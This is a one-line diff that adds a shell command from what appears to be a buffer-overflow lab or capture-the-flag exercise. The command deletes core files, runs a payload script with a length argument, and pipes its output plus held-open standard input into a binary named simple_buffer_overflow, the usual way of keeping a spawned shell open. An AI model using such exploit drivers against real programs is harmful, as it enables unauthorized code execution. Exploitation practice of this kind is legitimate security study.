@@ -1,0 +1,2 @@
+rm -rf core.* ; len=17 ; python payload.py $len ; (python payload.py $len; cat; )| ./simple_buffer_overflow ;d
+
